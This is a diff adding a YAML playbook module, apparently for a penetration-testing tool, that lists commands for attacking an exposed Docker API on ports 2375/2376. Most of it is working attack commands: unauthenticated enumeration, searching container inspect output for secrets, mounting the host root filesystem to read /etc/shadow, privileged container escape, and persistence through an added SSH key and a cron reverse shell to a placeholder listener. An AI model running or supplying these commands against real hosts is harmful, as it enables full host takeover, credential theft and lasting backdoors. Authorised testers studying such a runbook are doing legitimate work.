@@ -1,0 +1,74 @@
+module: docker
+name: Docker API (2375 / 2376)
+inputs: [OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / API reachable (unauth check)
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+          curl -s http://$IP:$PORT/version
+          docker -H tcp://$IP:$PORT version
+      - id: info
+        text: Daemon info (host OS, kernel, container count)
+        commands: |
+          curl -s http://$IP:$PORT/info
+          docker -H tcp://$IP:$PORT info
+
+  - id: enum
+    name: Enumeration
+    steps:
+      - id: containers
+        text: List running / all containers
+        commands: |
+          docker -H tcp://$IP:$PORT ps -a
+          curl -s "http://$IP:$PORT/containers/json?all=1"
+      - id: images
+        text: List images
+        commands: |
+          docker -H tcp://$IP:$PORT images
+          curl -s http://$IP:$PORT/images/json
+      - id: inspect
+        text: Inspect containers for env vars / secrets / mounts
+        manual: true
+        commands: |
+          docker -H tcp://$IP:$PORT inspect <id>
+          # look for passwords in Env, mounted host paths, capabilities
+
+  - id: creds
+    name: Authentication (TLS 2376)
+    steps:
+      - id: tls
+        text: Authenticated access with client certs (2376)
+        tls_only: true
+        commands: |
+          docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H tcp://$IP:$PORT ps
+
+  - id: exploit
+    name: Container Escape / Host Takeover
+    authorized: true
+    steps:
+      - id: mount_host
+        text: Mount host filesystem into a container (read/write host as root)
+        commands: |
+          docker -H tcp://$IP:$PORT run -v /:/host -it alpine chroot /host sh
+          docker -H tcp://$IP:$PORT run --rm -v /:/host alpine cat /host/etc/shadow
+      - id: privileged
+        text: Spawn a privileged container (full host access)
+        commands: |
+          docker -H tcp://$IP:$PORT run --privileged --net=host --pid=host -it alpine sh
+      - id: persistence
+        text: Write host files (SSH key / cron / sudoers) via mount
+        manual: true
+        commands: |
+          # echo '<pubkey>' >> /host/root/.ssh/authorized_keys
+          # echo '* * * * * root bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' > /host/etc/cron.d/x
+      - id: api_create
+        text: Same escape via raw API (no docker client)
+        manual: true
+        commands: |
+          # POST /containers/create with Binds ["/:/host"] then /start then /exec
